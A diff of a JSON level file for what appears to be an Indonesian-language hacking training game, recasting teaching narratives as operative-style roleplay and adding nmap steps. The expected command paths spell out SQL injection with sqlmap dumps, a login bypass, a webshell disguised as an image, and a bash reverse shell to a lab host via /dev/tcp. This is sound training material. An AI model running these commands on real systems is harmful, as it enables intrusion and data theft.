@@ -7,7 +7,7 @@
       "id": "m2_l1",
       "missionId": "mission_2",
       "title": "Endpoint Discovery",
-      "narrative": "Mission web dimulai dari pemetaan permukaan serang. Sebelum berbicara soal SQL injection atau bypass auth, pemain harus belajar menemukan endpoint yang relevan, parameter yang menarik, dan service mana yang paling layak diserang lebih dulu.",
+      "narrative": "[TARGET ACQUIRED] Operative, kita beralih ke vektor web. Aplikasi target tampak kokoh dari luar, tapi pasti ada celah. Sebelum melancarkan serangan injeksi, petakan permukaan serangnya. Cari endpoint pencarian atau parameter tersembunyi yang berinteraksi langsung dengan database mereka.",
       "domain": "web",
       "difficulty": 2,
       "topology": {
@@ -89,7 +89,7 @@
       "id": "m2_l2",
       "missionId": "mission_2",
       "title": "SQL Injection",
-      "narrative": "Setelah endpoint penting ditemukan, fokus beralih ke SQL injection dasar. Level ini sengaja dibuat langsung dan jelas: pemain menguji parameter rentan, menggunakan automation secukupnya, lalu membaca data flag dari database target.",
+      "narrative": "[HANDLER MESSAGE] Endpoint pencarian itu terlihat rapuh. Mari kita uji apakah filter input mereka menahan payload injeksi kita. Uji parameternya, lalu gunakan automasi (sqlmap) untuk membongkar struktur database (DBS) mereka. Ekstrak data sensitif dari tabel terdalam.",
       "domain": "web",
       "difficulty": 2,
       "topology": {
@@ -160,6 +160,7 @@
         }
       ],
       "expectedCommandPath": [
+        "nmap 192.168.60.15",
         "curl \"http://192.168.60.15/search?q=test'\"",
         "sqlmap -u \"http://192.168.60.15/search?q=test\" --dbs",
         "sqlmap -u \"http://192.168.60.15/search?q=test\" -D ctf_db -T flags --dump"
@@ -171,7 +172,7 @@
       "id": "m2_l3",
       "missionId": "mission_2",
       "title": "Auth Bypass",
-      "narrative": "Level ini memindahkan SQL injection dari endpoint pencarian ke form login. Tujuannya bukan dump database besar, tetapi memanipulasi logika autentikasi agar pemain memahami bagaimana input yang tampak kecil bisa membuka panel admin sepenuhnya.",
+      "narrative": "[AI CORE ALERT] Mereka mencoba memblokir akses kita dengan panel login Administrator. Sayangnya, logika autentikasi mereka masih menggunakan kueri SQL lawas. Jangan coba menebak kata sandi. Manipulasi input login mereka untuk membypass pengecekan sepenuhnya dan ambil alih panel kontrol.",
       "domain": "web",
       "difficulty": 3,
       "topology": {
@@ -242,6 +243,7 @@
         }
       ],
       "expectedCommandPath": [
+        "nmap 192.168.70.25",
         "curl -X POST http://192.168.70.25/login -d \"username=admin'--&password=test\"",
         "curl http://192.168.70.25/admin",
         "curl http://192.168.70.25/admin/flag"
@@ -253,7 +255,7 @@
       "id": "m2_l4",
       "missionId": "mission_2",
       "title": "File Upload Abuse",
-      "narrative": "Setelah punya akses admin, aplikasi membuka permukaan serang lain: upload file. Level ini fokus pada pelajaran inti unrestricted upload, yaitu bagaimana validasi yang hanya mengandalkan sisi klien atau Content-Type mudah dipatahkan.",
+      "narrative": "[SECURE LINK ESTABLISHED] Anda berada di dalam, Operative. Sekarang kita perlu menanamkan 'mata' kita di server mereka. Mereka memiliki fitur unggah file dengan validasi yang lemah. Samarkan muatan shell berbahaya Anda (webshell) sebagai file gambar, unggah, dan paksa peladen mereka untuk mengeksekusinya.",
       "domain": "web",
       "difficulty": 3,
       "topology": {
@@ -324,6 +326,7 @@
         }
       ],
       "expectedCommandPath": [
+        "nmap 192.168.80.30",
         "curl -F \"file=@shell.php;type=image/jpeg\" http://192.168.80.30/upload",
         "curl \"http://192.168.80.30/uploads/shell.php?cmd=ls\"",
         "curl \"http://192.168.80.30/uploads/shell.php?cmd=cat+/var/www/html/flag.txt\""
@@ -335,7 +338,7 @@
       "id": "m2_l5",
       "missionId": "mission_2",
       "title": "Webshell Pivot",
-      "narrative": "Penutup mission web berfokus pada operational control. Anda sudah punya webshell, sekarang tujuannya adalah mengubah foothold rapuh itu menjadi sesi yang lebih stabil dan cukup kuat untuk mengambil flag akhir dari server produksi.",
+      "narrative": "[DIRECTIVE UPDATE] Webshell yang kita tanam terlalu rapuh untuk operasi jangka panjang. Siapkan pendengar (listener) di terminal lokal Anda, lalu perintahkan webshell tersebut untuk mengirimkan koneksi balik (Reverse Shell) kepada kita. Ubah foothold ini menjadi cengkeraman permanen dan rebut Flag utama.",
       "domain": "web",
       "difficulty": 4,
       "topology": {
@@ -406,6 +409,7 @@
         }
       ],
       "expectedCommandPath": [
+        "nmap 192.168.90.50",
         "nc -lvnp 4444",
         "curl \"http://192.168.90.50/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.0.0.5/4444+0>%261'\"",
         "cat /var/www/html/secret/flag.txt"
